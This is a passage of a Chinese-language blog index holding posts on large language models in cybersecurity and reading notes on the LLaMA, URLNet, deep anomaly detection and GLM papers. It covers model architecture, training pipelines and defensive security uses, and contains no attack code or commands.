实现对有效网络攻击的智能研判。</li></ul><p>评估人工智能技术的安全性，推动人工智能技术的良性应用</p><ul><li>在制定人工智能的发展路线的同时应该要紧盯风险防御，加强对潜在风险的预判和研究，注重系统安全防御技术的发展，明确防御发展策略。</li><li>同时，应加强人工智能风险管理。人工智能自身存在的漏洞和人工智能技术的滥用是系统安全防御中很难避免的环节。自身存在的安全风险属于最致命的问题，应用越广泛，其带来的危害性也越大。系统安全防御技术要从人工智能技术自身入手，构建主动免疫的计算构架，尽可能地降低技术自身的漏洞危害，不断创新保持技术优势。</li></ul><h3 id="鼓励合作与跨界合作的重要性"><a href="#鼓励合作与跨界合作的重要性" class="headerlink" title="鼓励合作与跨界合作的重要性"></a>鼓励合作与跨界合作的重要性</h3><p>人工智能最重要的因素是数据，然而受限于隐私和数据安全，注定了网络安全领域的数据难以共享，无法建立统一的数据集或语料库。单靠某一家安全公司或企业难以实现宏大的目标，所以需要有着完善及合作机制，甚至是实现跨界合作，集万家之所长。</p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NLP </tag>
            
            <tag> IA </tag>
            
            <tag> GenAI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Large Language Model (LLM) 漫谈</title>
      <link href="/2023/06/28/LLM/"/>
      <url>/2023/06/28/LLM/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自从 ChatGPT 上线以来，LLM (Large Language Model) 的热潮席卷了各行各业。Meta 开源的 LLaMA 模型给头部玩家进入这一领域提供了导航，Standford Alpaca 和 Microsoft LoRA 给小玩家们提供了低成本的玩法，总之只要想玩，人人可上手（PS. 老黄真的是秦始皇吃花椒 - 赢麻了，前有矿潮，后有AI，臭打游戏的能有几个钱，无足挂齿）。LLM 从刚开始的通用模型，到现在各个行业都在考虑垂直领域中的应用，网络安全领域当然也不例外。</p><span id="more"></span><h2 id="发展背景"><a href="#发展背景" class="headerlink" title="发展背景"></a>发展背景</h2><p>LLM 的崛起主要取决于3方面的因素：数据，算力，算法。</p><p>首先是数据方面，在信息爆炸的年代，加上元宇宙， WEB3 等概念的加持，数据上云，全民共享成为了时代的主流。在线社交网络，万物互联的物联网，移动互联网都为 LLM 提供了丰富的语料数据，Github 等代码托管平台提供了丰富的高质量代码数据……</p><p>然后是算力方面，归功于半导体行业的产业迭代带来的硬件支持，以及 NVIDIA 开启的 GPU 加速时代，老黄不遗余力发展的 CUDA，cuDNN 等配套软件支持。TensorFlow，Pytorch 为代表的 AI 框架降低了这一领域的门槛，同时也拉高了上限，以及 DeepSpeed 等并行计算框架带来的算力的成倍增长。</p><p>最后是算法方面，深度学习算法的迭代更新速度飞快，以 Transformer 为代表的算法框架逐渐突破了原来对深度网络结构的限制。</p><p>总之，现在的 LLM 崛起是量变引起质变的过程。</p><h2 id="关键技术"><a href="#关键技术" class="headerlink" title="关键技术"></a>关键技术</h2><p>2017年由 Google 团队提出的 Transformer 模型，是目前所有大语言模型的基础架构。</p><p>Attention is All You Need：<a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a></p><center>    <img src="/img/LLM/LLM1.png" width="850"></center><p>图中最右边的结构是论文中 Transformer 的内部结构图，左侧为 Encoder block，右侧为 Decoder block，Encoder 和 Decoder 都包含 6 个 block。红色圈中的部分为 Multi-Head Attention，是由多个 Self-Attention组成的，可以看到 Encoder block 包含一个 Multi-Head Attention，而 Decoder block 包含两个 Multi-Head Attention (其中有一个用到 Masked)。Multi-Head Attention 上方还包括一个 Add &amp; Norm 层，Add 表示残差连接 (Residual Connection) 用于防止网络退化，Norm 表示 Layer Normalization，用于对每一层的激活值进行归一化。</p><p>图中最左边是 Self-Attention 的结构，在计算的时候需要用到矩阵Q(查询),K(键值),V(值)。在实际中，Self-Attention 接收的是输入(单词的表示向量x组成的矩阵X) 或者上一个 Encoder block 的输出。而Q,K,V正是通过 Self-Attention 的输入进行线性变换得到的。</p><p>图中左二 Multi-Head Attention 是由多个 Self-Attention 组合形成。</p><p>关于 Transformer 的更多细节介绍参考<a href="https://zhuanlan.zhihu.com/p/338817680">这里</a>。</p><center>    <img src="/img/LLM/LLM2.png" width="850"></center><p>GPT 和 BERT都是基于 Transformer 的与训练语言模型，都是通过“预训练+微调”的模式完成下游任务的搭建。GPT是单向模型，只利用上文信息推断下文，而BERT是双向模型。GPT 基于自回归模型，可完成 NLU（Natural Language Understanding）和 NLG（Natural Language Generation）任务。原生 BERT 基于自编码模型，无法直接应用于文本生成任务。</p><h2 id="发展历程"><a href="#发展历程" class="headerlink" title="发展历程"></a>发展历程</h2><center>    <img src="/img/LLM/LLM3.png" width="850"></center> <p>LLM 的发展经历了多年的积累，从单纯的 NLP 任务转变成为现在的多模态模型，也引申出了 Prompt 工程的概念，涉及到 AI Ethics 的内容也逐渐被重视。随着大语言模型的逐渐开源化和社区化，未来一定是越来越好的。</p><h2 id="垂直领域"><a href="#垂直领域" class="headerlink" title="垂直领域"></a>垂直领域</h2><p>LLM 带来的变革深入各个产业，于是垂直领域的 LLM 越来越成为焦点。但是这里面临的主要问题是数据源，各个垂直领域有关数据的开放程度不尽相同。以网络安全领域为例，各家的安全数据不仅不可能共享，甚至公司内部也权限森明，导致了安全领域的 LLM 必然面临着数据源不充足的问题。</p><p>与此同时，LLM 对安全领域带来的冲击也是巨大的。</p><p>对于攻击方来说，攻击手段更为普及，高级攻击手段的门槛降低。通过 LLM 可以快速生成各种各样的高级混淆手段，定向的钓鱼邮件，钓鱼页面也可以通过 LLM 快速定制。攻击方的攻击速度也大大提升，绕过手法可以快速迭代，漏洞利用代码也能快速开发，1 Day 可能真的就是物理意义上的“1 Day”。</p><p>然而与之相对的防守方，LLM 加剧了与攻击方人员的能力、知识、技术的不对等，无法面对高级攻击常态化的趋势。防守方传统的防守手段高度依赖高水平的安全人员，然而现状却是安全人员的长期缺乏。同时防守方的自动化能力不足，迫切的需要机器对抗机器的手段。</p><h2 id="构建流程"><a href="#构建流程" class="headerlink" title="构建流程"></a>构建流程</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>想要构建一个大语言模型，首先第一步是要预训练出一个初步的 NLP 模型，目的是通过给定的 Token， 能够预测下一个 Token。</p><center>    <img src="/img/LLM/LLM4.png" width="850"></center><p>具体方式通过计算模型预测的下一个单词与真实的下一个单词之间的误差，通过算法获取降低误差的梯度，传播梯度更新模型参数。</p><center>    <img src="/img/LLM/LLM5.png" width="850">    <img src="/img/LLM/LLM6.png" width="850"></center><p>第二步是微调 Fine-Tune， 收集特定领域的数据，由该领域额专家对这些数据进行精心标注，通过上一步类似的训练手段，进一步更新模型的参数权重。</p><center>    <img src="/img/LLM/LLM7-1.png" width="850">    <img src="/img/LLM/LLM7-2.png" width="850"></center><p>微调完成之后的模型就已经有了不错的变表现，可以部署推理了。输入一个句子，预测每个单词出现的频率，将频率最大的作为输出，循环往复，直到遇到终止符。</p><center>    <img src="/img/LLM/LLM8.png" width="850"></center><h3 id="训练流程"><a href="#训练流程" class="headerlink" title="训练流程"></a>训练流程</h3><p>一个完整 LLM 构建流程其实包含4步，除了前面说的预训练和微调之后，还需要通过奖励模型以及强化学习的手段进一步加强模型的能力。</p><center>    <img src="/img/LLM/LLM9.png" width="850"></center><h2 id="建设方案"><a href="#建设方案" class="headerlink" title="建设方案"></a>建设方案</h2><h3 id="二次复现"><a href="#二次复现" class="headerlink" title="二次复现"></a>二次复现</h3><p> Meta 放出的 LLaMA 模型基本做到了全开源，根据<a href="http://arxiv.org/abs/2302.13971">论文</a>中的信息，LLaMA 的全部数据源均可获取，训练模型的超参数也基本公布，在模型结构上做的调整也详细列出，这就意味着 LLaMA 的结果完全可以复刻。</p><center>    <img src="/img/LLM/LLM10.png" width="850">    <img src="/img/LLM/LLM11.png" width="850">    <img src="/img/LLM/LLM12.png" width="850"></center><h3 id="权重微调"><a href="#权重微调" class="headerlink" title="权重微调"></a>权重微调</h3><p>对于财力和实力不够的玩家来说，微调是另一个可行的建设方案，无论是基于 LLaMA 还是 THUDM&#x2F;GLM 模型的微调都能够在垂直领域有一定的效果。但是考虑到数据、基础语料以及模型权重的 License 等问题，想要有非常好的效果也是不现实的。</p><p>微调的方式目前有很多，比如 <a href="https://github.com/tatsu-lab/stanford_alpaca">Stanford Alpaca</a>、<a href="https://github.com/tloen/alpaca-lora">LoRA</a>、<a href="https://github.com/THUDM/P-tuning-v2">P-Tuning v2</a> 等。</p><center>    <img src="/img/LLM/LLM13.png" width="850">    <img src="/img/LLM/LLM14.png" width="850"></center><h2 id="研究进展"><a href="#研究进展" class="headerlink" title="研究进展"></a>研究进展</h2><h3 id="项目推进"><a href="#项目推进" class="headerlink" title="项目推进"></a>项目推进</h3><p>目前在推进的是 LLM 在安全领域的应用，覆盖两种建设方案。在权重微调方面，基于 LLaMA 模型，结合蜜罐数据，尝试将大语言模型作为蜜罐后台，模拟服务端的返回。此外也在尝试通过安全专家标注的网络攻击数据，训练 LLM 对网络攻击的检测能力，并提供判断思路。</p><p>由于目前开放的大模型都涉及到 License 问题，研究学习当然没问题，一旦从产品的角度考虑商用，就会收到权重的限制。所以需要重新进行预训练，调整模型的全部权重，其实也就是在做复现 LLaMA 的工作。</p><p>LangChain + LLM 的思路也很值得尝试。通过 LangChain 将本地的大量的威胁情报和 LLM 结合，制作本地知识库也是目前推动的方向。</p><h3 id="发展方向"><a href="#发展方向" class="headerlink" title="发展方向"></a>发展方向</h3><p>除了 Prompt 工程以外，培养模型的链式思维（Chain of Thoughts）也是热门方向。链式思维主要是培养模型的 Zero-Shot 能力，对于安全领域来说，这一方向的意义在于希望 LLM 能够在无样本的情况下检测 0 Day 攻击。</p><center>    <img src="/img/LLM/LLM15.png" width="850"></center><p>安全领域的 LLM 整体解决方案目前看来有两种。一种是将 LLM 作为分析中台，所有的数据通过 LLM 进行分析，通过其开放的 API 接口获取结果。另一种是将 LLM 作为调度中台以及人机交互接口，所有的安全数据由 LLM 调度分发，通过更简单快捷的小模型及其他分析引擎处理分析，分析结果整合成为一个统一的数据格式交由 LLM 与用户沟通，用更简单通俗的自然语言充当一个安全专家的形象。</p><p>虽然目前 LLM 还有很多问题，但是起码让我们看到了它的潜力，希望这是黎明前的那道曙光，身前一片坦途。</p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> AI </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NLP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLaMA - Open and Efficient Foundation Language Models</title>
      <link href="/2023/03/28/LLaMA/"/>
      <url>/2023/03/28/LLaMA/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：LLaMA: Open and Efficient Foundation Language Models</li><li>作者：Hugo Touvron, Thibaut Lavril, Gautier Izacard, Xavier Martinet Marie-Anne Lachaux, Timothee Lacroix, Baptiste Rozière, Naman Goyal Eric Hambro, Faisal Azhar, Aurelien Rodriguez, Armand Joulin Edouard Grave, Guillaume Lample - Meta AI</li><li>原文链接：<a href="http://arxiv.org/abs/2302.13971">LLaMA: Open and Efficient Foundation Language Models</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>训练了一系列的语言模型在不同的推断预算上实现最佳表现，模型参数从7B到65B不等。其中，13B模型大多数 benchmarks 表现超越 GPT-3，规模只有 GPT-3 的十分之一。65B模型能够和最大最好的语言模型 Chinchilla 或 PaLM-540B 竞争。</li><li>65B模型在2048张A100（80GB RAM）的集群，包含1.4T tokens的数据集情况下，训练时间为约为21天。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>通过多头注意力（Multi-head attention）机制减少内存使用以及运行时间。具体实现为不存储 attention 权重，不计算 key&#x2F;query 的分数。</li><li>为了提升训练效率，减少了 backword pass 过程中重新计算 avtivations 的数量。更准确的说，保存了很难计算的 activations，比如线性层的输出。实际是通过手动实现 transformer 层的 backward 功能函数，而不是依赖于 PyTorch 提供的 autograd 方法。</li><li>尽可能多的重叠 activations 以及 GPU 之间通过网络的交流两部分产生计算（通过 all_reduce 操作）。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><h3 id="Pre-training-Data"><a href="#Pre-training-Data" class="headerlink" title="Pre-training Data"></a>Pre-training Data</h3><ul><li>English CommonCrawl：通过 fastText 线性分类器预处理了 CCNet pipeline【1】获取的数据，去除了非英语页面，并通过一个 n-gram 语言模型过滤掉了低质量内容。</li><li>C4：公开可获取的数据集，同样包含去重和语言识别等预处理过程。</li><li>Github：在 Google BigQuery 上可公开获取的公共 Github 数据集。</li><li>Wikipedia：覆盖20种语言，去除了超链接，评论和其他格式化的内容。</li><li>Gutenberg and Books3：从书籍层面去重，转化为数据集。</li><li>ArXiv：去除第一节之前的部分，引用，评论，行内扩展的定义等作为科研类数据集。</li><li>Stack Exchange：高质量的问答类数据，覆盖多元领域。</li></ul><center>    <img src="/img/LLaMA/1.png" width="850"></center><p>分词器（Tokenizer）基于 bytepair encoding（BPE）算法【2】，具体实现参考 SentencePiece【3】。处理完成之后，整体数据集大约包含1.4T tokens。除了 Wikipedia 和 Books 的数据运行了大约 2 轮之外，其他数据只使用一次。</p><h3 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h3><ul><li>神经网络基于 transformer architecture【4】，改进点如下：<ul><li>Pre-normalization [GPT3]：每一个 transformer sub-layer，通过 RMSNorm 归一化函数【5】归一化输入而不是输出。</li><li>SwiGLU activation function [PaLM]：用 SwiGLU 激活函数【6】替换 ReLU。PaLM 中维度数据使用（2&#x2F;3）4d而非4d。</li><li>Rotary Embeddings [GPTNeo]：移除绝对位置嵌入（absolute positional embeddings），加入 rotary positional embeddings（RoPE）【7】。</li></ul></li></ul><h3 id="Optimizer"><a href="#Optimizer" class="headerlink" title="Optimizer"></a>Optimizer</h3><ul><li>Optimizer 使用 the AdamW optimizer【8】，超参数 β1 &#x3D; 0.9，β2 &#x3D; 0.95。最终学习速率是最大学习速率的10%。weight decay 为 0.1，gradient clipping 为 1.0，warmup steps 为 2000。</li><li>优化的具体实现可通过 <a href="https://github.com/facebookresearch/xformers">xformers库</a>。</li></ul><center>    <img src="/img/LLaMA/2.png" width="850"></center><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>以更小的模型体积实现更好的性能，降低了大语言模型实用场景的门槛。</li><li>技术特点均有提及，训练集均可获得，过程复现的可能性大，但仍需要进一步研究。</li><li>Finetuning 的过程及技术未提及。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><p>Guillaume Wenzek, Marie-Anne Lachaux, Alexis Conneau, Vishrav Chaudhary, Francisco Guzmán, Armand Joulin, and Edouard Grave. 2020. CCNet: Extracting high quality monolingual datasets from web crawl data. In Language Resources and Evaluation Conference.</p><p> <a href="https://aclanthology.org/2020.lrec-1.494/">CCNet: Extracting High Quality Monolingual Datasets from Web Crawl Data</a></p></li><li><p>Rico Sennrich, Barry Haddow, and Alexandra Birch. 2015. Neural machine translation of rare words with subword units. arXiv preprint arXiv:1508.07909.</p><p> <a href="https://arxiv.org/abs/1508.07909">Neural Machine Translation of Rare Words with Subword Units</a></p></li><li><p>Taku Kudo and John Richardson. 2018. Sentencepiece: A simple and language independent subword tokenizer and detokenizer for neural text processing. arXiv preprint arXiv:1808.06226.</p><p> <a href="https://arxiv.org/abs/1808.06226">SentencePiece: A simple and language independent subword tokenizer…</a></p></li><li><p>Ashish Vaswani, Noam Shazeer, Niki Parmar, Jakob Uszkoreit, Llion Jones, Aidan N Gomez, Ł ukasz Kaiser, and Illia Polosukhin. 2017. Attention is all you need. In Advances in Neural Information Processing Systems 30, pages 5998–6008.</p><p> <a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a></p></li><li><p>Biao Zhang and Rico Sennrich. 2019. Root mean square layer normalization. Advances in Neural Information Processing Systems, 32.</p><p> <a href="https://arxiv.org/abs/1910.07467">Root Mean Square Layer Normalization</a></p></li><li><p>Noam Shazeer. 2020. Glu variants improve transformer. arXiv preprint arXiv:2002.05202.</p><p> <a href="https://arxiv.org/abs/2002.05202">GLU Variants Improve Transformer</a></p></li><li><p>Jianlin Su, Yu Lu, Shengfeng Pan, Ahmed Murtadha, Bo Wen, and Yunfeng Liu. 2021. Roformer: Enhanced transformer with rotary position embedding. arXiv preprint arXiv:2104.09864.</p><p> <a href="https://arxiv.org/abs/2104.09864">RoFormer: Enhanced Transformer with Rotary Position Embedding</a></p></li><li><p>lya Loshchilov and Frank Hutter. 2017. Decoupled weight decay regularization. arXiv preprint arXiv:1711.05101.</p><p> <a href="https://arxiv.org/abs/1711.05101">Decoupled Weight Decay Regularization</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Essay </category>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NLP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLNet - Learning a URL Representation with Deep Learning for Malicious URL Detection</title>
      <link href="/2023/03/23/URLNet/"/>
      <url>/2023/03/23/URLNet/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：URLNet: Learning a URL Representation with Deep Learning for Malicious URL Detection</li><li>作者：Hung Le, Quang Pham, Doyen Sahoo, Steven C.H. Hoi</li><li>原文链接：<a href="https://www.notion.so/URLNet-Learning-a-URL-Representation-with-Deep-Learning-for-Malicious-URL-Detection-cf17c9a112c94c3fb34989937cb65fb7?pvs=4#225ae0a525f64fa8b9d0fdf24a921202">arxiv</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>传统的恶意Url检测局限于黑名单，导致难以快速反应，同时无法检测不在黑名单中的未知恶意Url。</li><li>为了解决传统黑名单检测带来的滞后性，机器学习算法的介入提供了全新的方向。但是传统的机器学习算法依赖于特征提取技术。目前词袋模型作为最常用的语义特征提取技术，在面对恶意Url检测时存在许多挑战。比如难以准确的截取极具特征的字符串片段，无法学习到未知特征等。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>论文提出了基于深度学习的恶意Url检测方案URLNet，从字符以及词两种维度分别进行表示，通过CNN网络训练学习，最后结合两种种维度的特征获取结果。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><ul><li>样本中的URL统一只保留前200个字节，多余的部分截断，不足的部分用<PAD>填充。<center>  <img src="/img/URLNet/1.png" width="850"></center><center>  <img src="/img/URLNet/2.png" width="850"></center></li><li>特征提取<ul><li>Whole URL BoW<ul><li>Bag of Words</li><li>独特词的数量</li></ul></li><li>URL Component Tokenisation (UCT)。将URL分成主域名，路径，最终路径标识，最顶层域名。对每个部分分别建立BoW字典。</li><li>Position Sensitive &amp; Bigrams (PSB)。特殊字符如域名和路径会被提取出来组成大的字符，同时标记其相对位置。</li><li>Character Trigrams。通过3个字符大小的滑动窗口处理URL中的域名生成新的tokens。</li><li>其他统计学特征：URL长度，hostname长度，URL中点的个数等。这些特征由具备专业知识的人员设计。</li></ul></li></ul><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>文章提出了一种全新的基于语义的深度学习恶意Url检测模型，提供了从单个字符及单个词两种角度结合的分析视角，值得借鉴。</li><li>在从词的角度进行分析的网络中，论文在传统词袋模型之外提出了一些新的特征处理方法，并通过实验结果验证了有效性。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.notion.so/URLNet-Learning-a-URL-Representation-with-Deep-Learning-for-Malicious-URL-Detection-cf17c9a112c94c3fb34989937cb65fb7?pvs=4#face0efdfdb3455a9c1b48d6122295f9">Aaron Blum, Brad Wardman, Thamar Solorio, and Gary Warner. 2010. Lexical feature based phishing URL detection using online learning. In Proceedings of the 3rd ACM Workshop on Artificial Intelligence and Security. ACM, 54–60.</a></li></ol><h2 id="Related-Materials"><a href="#Related-Materials" class="headerlink" title="Related Materials"></a>Related Materials</h2><ul><li><a href="https://github.com/Antimalweb/URLNet">URLNet</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Essay </category>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Deep Learning </tag>
            
            <tag> NLP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Deep Learning for Anomaly Detection - A Review</title>
      <link href="/2023/03/21/DLforAD/"/>
      <url>/2023/03/21/DLforAD/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：Deep Learning for Anomaly Detection: A Review</li><li>作者：<ul><li>GUANSONG PANG, University of Adelaide</li><li>CHUNHUA SHEN, University of Adelaide</li><li>LONGBING CAO, University of Technology Sydney</li><li>ANTON VAN DEN HENGEL, University of Adelaide</li></ul></li><li>原文链接：<a href="https://arxiv.org/abs/2007.02500">arxiv</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>异常检测（Anomaly &#x2F; Outlier &#x2F; Novelty detection）在过去的几十年里都是热门研究话题，但是仍然存在许多复杂的问题和挑战需要更进一步的研究。</li><li>这篇论文主要介绍了基于深度学习的异常检测技术，涵盖了3大类，11个小类的理论方法。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>问题本质和挑战。作者提到了异常检测中遇到的特殊问题的复杂度以及由此造成的许多未解决的挑战。</li><li>问题分类和总结。本文将现有的深度学习异常检测方法归总为3中理论框架：深度学习普遍特征提取，正常样本的表示，端到端异常分数学习。所有的方法从11个不同的建模层面进行的分类。</li><li>深度解析其他的论文研究内容。</li><li>未来的机遇与挑战。</li><li>源代码及数据集。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><ul><li><p>由于异常检测问题本身的特质导致的复杂性：</p><ul><li>未知性</li><li>异常与异常之间就有着不同的特征</li><li>异常样本数量极少导致的黑白样本比例极不均衡</li><li>异常类型的多种多样<ul><li>点异常</li><li>条件异常</li><li>组异常</li></ul></li></ul></li><li><p>深度学习异常检测面临的挑战</p><ul><li>CH1：低recall rate（样本中的正例多少被预测正确， TP&#x2F;TP+FN）</li><li>CH2：面对高维数据或者相互不独立数据表现一般，如何降维以及降维后如何保证原有信息完整也是挑战</li><li>CH3：由于数据量的有限，如何提高数据使用的有效性。监督学习需要大量的有标签数据，非监督学习依赖于对于异常分布的正确假设，半监督学习是一种解决方向。另一种解决方向是<code>weakly-supervised anomaly detection</code></li><li>CH4：许多弱监督&#x2F;半监督算法抗噪能力不好</li><li>CH5：现有很多异常检测算法均针对点异常，面对上下文异常及组异常效果不好</li><li>CH6：模型可解释性不强，面对某些争议难以合理解释<center>  <img src="/img/DLforAD/1.png" width="800"></center></li></ul></li><li><p>深度学习异常检测方法分类</p><center>  <img src="/img/DLforAD/2.png" width="850"></center></li><li><p>深度学习特征提取</p><ul><li>直接运用流行的深度学习模型AlexNet【1】，VGG【2】，ResNet【4】等提取低维度特征</li><li>训练深度学习特征提取模型进行异常分数评估</li></ul></li><li><p>正常样本表示</p><ul><li>通用正常特征学习，优化通用样本数据特征表示方法<ul><li>Autoencoder（AE）</li><li>GAN-based 异常检测</li><li>基于预测模型的特征学习方法，用之前的数据实例预测现在的数据实例</li><li>自监督学习</li></ul></li><li>针对存在的已知异常特殊优化的异常评估模型<ul><li>基于距离的评估手段</li><li>针对单类型的异常分类器</li><li>基于聚类的评估手段</li></ul></li><li>端到端异常评分学习 - 不仅仅局限于已知异常，着重于基于深度神经网络直接学习评估异常分数<ul><li>排名模型<ul><li>设计基于逻辑回归损失函数的异常评分模型【5】</li><li>先验模型：已知数据集的分布特性</li></ul></li><li>概率模型 - 通过最大化在训练集中事件的可能性来学习异常评分</li><li>端到端单种类分类器<ul><li>对抗学习单种类分类器（adversarially learned one-class classification，ALOCC）【6】</li></ul></li></ul></li></ul></li></ul><h2 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h2><ol><li>异常检测方法根据检测环境的不同有比较大的差距。理想情况下需要先了解实际环境中的异常种类、分布等信息，然后对症下药，选择合适的特征工程以及检测算法。但是大多数情况下均不满足这些条件，给检测工作带来许多难题，最终导致模型检测结果不尽如人意。</li><li>深度学习可以针对性的解决部分异常检测面临的挑战，但是也需要针对具体问题灵活选择合适算法。</li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#3e5880a9bd784529ad5022b751a168ba">Alex Krizhevsky, Ilya Sutskever, and Geoffrey E Hinton. 2012. Imagenet classification with deep convolutional neural networks.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#a854d669d0e74fcf9241cdbab8d2ba3f">Karen Simonyan and Andrew Zisserman. 2015. Very deep convolutional networks for large-scale image recognition. In ICLR.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#c42b25debe154c99ac44769a22218463">Radu Tudor Ionescu, Sorina Smeureanu, Bogdan Alexe, and Marius Popescu. 2017. Unmasking the abnormal events in video. In ICCV. 2895–2903.</a></li><li><a href="https://openaccess.thecvf.com/content_cvpr_2016/html/He_Deep_Residual_Learning_CVPR_2016_paper.html">Kaiming He, Xiangyu Zhang, Shaoqing Ren, and Jian Sun. 2016. Deep residual learning for image recognition. In CVPR. 770–778.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#b46593aa01974e8aa73a0f89fba37aca">Guansong Pang, Cheng Yan, Chunhua Shen, Anton van den Hengel, and Xiao Bai. 2020. Self-trained Deep Ordinal Regression for End-to-End Video Anomaly Detection. In CVPR. 12173–12182.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#9075f53359e1410bbd44f59325c117de">Mohammad Sabokrou, Mohammad Khalooei, Mahmood Fathy, and Ehsan Adeli. 2018. Adversarially learned one-class classifier for novelty detection. In CVPR. 3379–3388.</a></li><li><a href="https://www.notion.so/Deep-Learning-for-Anomaly-Detection-A-Review-27ba856b85f147f1b3cb114a93848f63?pvs=4#78435f94252346e1b2e1295acb851f75">Guansong Pang, Chunhua Shen, Huidong Jin, and Anton van den Hengel. 2019. Deep Weakly-supervised Anomaly Detection. arXiv preprint:1910.13601 (2019).</a></li></ol><h2 id="Related-Materials"><a href="#Related-Materials" class="headerlink" title="Related Materials"></a>Related Materials</h2><ul><li>算法列表<center>  <img src="/img/DLforAD/3.png" width="850"></center><center>  <img src="/img/DLforAD/4.png" width="850"></center></li><li><a href="https://git.io/JTs93">数据集列表</a><center>  <img src="/img/DLforAD/5.png" width="850"></center></li></ul>]]></content>
      
      
      <categories>
          
          <category> Essay </category>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Anomaly Detection </tag>
            
            <tag> Deep Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GLM - General Language Model Pre-training with Autoregressive Blank Infilling</title>
      <link href="/2023/03/21/GLM/"/>
      <url>/2023/03/21/GLM/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><ul><li>名称：GLM: General Language Model Pre-training with Autoregressive Blank Infilling</li><li>作者：<ul><li>Zhengxiao Du：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Yujie Qian：MIT CSAIL</li><li>Xiao Liu：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Ming Ding：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Jiezhong Qi：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li><li>Zhilin Yang：Tsinghua University，Shanghai Qi Zhi Institute</li><li>Jie Tang：Tsinghua University，Beijing Academy of Artificial Intelligence (BAAI)</li></ul></li><li>原文链接：<a href="https://www.notion.so/GLM-General-Language-Model-Pre-training-with-Autoregressive-Blank-Infilling-5e61ef3557d2439bb3a3b344e8b26583?pvs=4#56fecaacdf6049f9bdb25e7edacb7f11">arxiv</a></li></ul><span id="more"></span><h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><ul><li>现有的预训练框架无法灵活的应对所有NLP任务，本文提出基于自回归 + 空白填充（blank infilling）的预训练模型GLM（General Language Model）应对NLU（Natural Language Understanding）任务以及文本生成任务。</li></ul><h2 id="Contributions"><a href="#Contributions" class="headerlink" title="Contributions"></a>Contributions</h2><ol><li>结合AR（autoregressive）模型和空白填充（blank infilling）技术，提出GLM预训练框架应对NLU和长文本生成为主的多种NLP任务。</li><li>在原来空白填充基础上提出了两个创新，span shuffling 和 2D positional encoding。</li></ol><h2 id="Paragraph"><a href="#Paragraph" class="headerlink" title="Paragraph"></a>Paragraph</h2><h3 id="Sec-1"><a href="#Sec-1" class="headerlink" 